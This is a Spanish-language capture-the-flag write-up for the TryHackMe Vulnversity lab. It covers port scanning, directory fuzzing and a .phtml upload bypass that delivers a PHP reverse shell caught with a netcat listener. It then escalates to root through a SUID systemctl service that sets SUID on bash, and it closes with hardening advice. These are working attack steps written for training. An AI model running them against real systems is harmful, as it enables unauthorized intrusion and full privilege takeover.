# 🚀 Explotación de Máquina Vulnversity (TryHackMe)

![Nivel: Fácil](https://img.shields.io/badge/Nivel-Fácil-green) ![Tema: Web Exploitation + PrivEsc](https://img.shields.io/badge/Tema-Web%20Exploitation%20%2B%20PrivEsc-blue)

## **Descripción**
Este documento detalla la explotación completa de la máquina **Vulnversity** de TryHackMe, que incluye:
1. Reconocimiento de puertos y servicios
2. Fuzzing de directorios web
3. Bypass de restricciones de subida de archivos
4. Reverse shell PHP
5. Escalada de privilegios mediante abuso de systemctl SUID

**Tiempo estimado**: 30-45 minutos  
**Dificultad**: Fácil  
**Sistema operativo**: Linux

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web](#enumeración-web)
3. [Bypass de Subida de Archivos](#bypass-de-subida-de-archivos)
4. [Reverse Shell](#reverse-shell)
5. [Escalada de Privilegios](#escalada-de-privilegios)
6. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Puertos
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.10.140.228
```

**Resultados**:
- **Puerto 3333/tcp**: HTTP - Servidor web (objetivo principal)
- Otros 5 puertos abiertos adicionales

## **Enumeración Web**

### 2. Fuzzing de Directorios
```bash
gobuster dir -u http://10.10.140.228:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

**Hallazgo crítico**:
- **/internal/**: Directorio que permite subida de archivos

### 3. Descubrimiento de Subdirectorios
- Segundo fuzzing en `/internal/` revela:
- **/uploads/**: Directorio donde se almacenan los archivos subidos

## **Bypass de Subida de Archivos**

### 4. Análisis de Extensiones Permitidas
- El servidor acepta archivos con extensión **.phtml**
- Se utiliza un Reverse Shell en PHP de [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell)
- Modificaciones: IP y puerto cambiados por los de la máquina atacante

## **Reverse Shell**

### 5. Subida y Ejecución de Payload
- Archivo malicioso subido: `shell.phtml`
- Puesta en escucha con Netcat:
```bash
nc -nlvp 4444
```
- Ejecución accediendo a: `http://10.10.140.228:3333/uploads/shell.phtml`

### 6. Flag de Usuario
```bash
cat /home/bill/user.txt
```
- **User Flag**: `[Redacted]`

### 7. Tratamiento de TTY
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
```

## **Escalada de Privilegios**

### 8. Enumeración de Binarios SUID
```bash
find / -perm -4000 2>/dev/null
```

**Hallazgo**:
- **/bin/systemctl**: Binario con permisos SUID

### 9. Explotación mediante GTFOBins
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

### 10. Obtención de Shell Root
```bash
bash -p
```

### 11. Flag de Root
```bash
cat /root/root.txt
```
- **Root Flag**: `[Redacted]`

## **Conclusión**

### Vulnerabilidades Críticas
1. **Subida de archivos sin validación** adecuada de extensiones
2. **Ejecución de archivos .phtml** en directorio accesible
3. **Permisos SUID peligrosos** en systemctl

### Hardening Recomendado
- Implementar validación estricta de tipos de archivo subidos
- Restringir permisos de ejecución en directorios de uploads
- Eliminar permisos SUID innecesarios de binarios del sistema
- Auditar regularmente los permisos de archivos y directorios

### Técnicas Aplicadas
1. **Escaneo de puertos** con Nmap
2. **Fuzzing de directorios** con Gobuster
3. **Bypass de restricciones** de subida de archivos
4. **Reverse Shell PHP** con .phtml
5. **Abuso de binarios SUID** para escalada de privilegios

---

**Herramientas utilizadas**:
- Nmap
- Gobuster
- Netcat
- Linux commands

**Referencias**:
- [PHP Reverse Shell - PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell)
- [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

**Tags**: `#TryHackMe #Vulnversity #FileUpload #SUID #PrivEsc #Systemctl`

---

## **Lecciones Aprendidas**
- Las validaciones de subida de archivos deben ser exhaustivas
- Los directorios de uploads nunca deben tener permisos de ejecución
- Los binarios con permisos SUID representan un riesgo significativo
- La enumeración meticulosa es clave para encontrar vectores de ataque

## **Notas Adicionales**
- La extensión .phtml permite ejecución de código PHP
- Systemctl con SUID permite crear servicios maliciosos
- Siempre realizar tratamiento de TTY para shells interactivas

---

## **Comandos Críticos de Explotación**

### Reconocimiento
```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.10.140.228
```

### Enumeración Web
```bash
gobuster dir -u http://10.10.140.228:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### Reverse Shell
```bash
nc -nlvp 4444
```

### Escalada de Privilegios
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
bash -p
```

### Búsqueda de Flags
```bash
find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
```
